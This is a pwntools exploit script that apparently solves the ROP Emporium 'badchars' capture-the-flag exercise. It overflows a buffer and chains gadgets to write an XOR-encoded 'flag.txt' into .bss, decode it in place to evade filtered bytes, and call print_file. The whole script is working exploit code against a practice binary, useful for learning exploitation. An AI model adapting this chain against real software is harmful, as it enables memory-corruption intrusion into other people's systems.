from pwn import *
context.log_level = 'DEBUG'
elf = ELF("badchars")
r = process("./badchars")

bss = p64(0x0000000000601038)
xor = p64(0x0000000000400628)  #xor byte ptr [r15], r14b ; ret
pop_rdi = p64(0x00000000004006a3)
r_pops = p64(0x000000000040069c)  #pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
r13_ptr = p64(0x0000000000400634) #mov qword ptr [r13], r12 ; ret
pop_r14_r15 = p64(0x00000000004006a0)  #pop r14 ; pop r15 ; ret
print_file = p64(0x0000000000400510)
xored_flag = p64(0x777b772d64626f65) #flag.txt xored with 3

#fill the buffer and saved rbp. xored_flag to r12 and bss address to r13. then r12 to [r13] which stored the string in the bss address
#we have to xor each bye of the string with 3 and store it in bss. the bss into rdi and call print_file boom.

payload = b"A"*40 + r_pops + xored_flag + bss + p64(0) + p64(0) + r13_ptr
for i in range(8):
    payload += pop_r14_r15 + p64(3) + p64(0x0000000000601038 + i) + xor
    print(hex(0x0000000000601038 + i))

payload += pop_rdi + bss + print_file

r.write(payload)
r.recvall()
r.interactive()
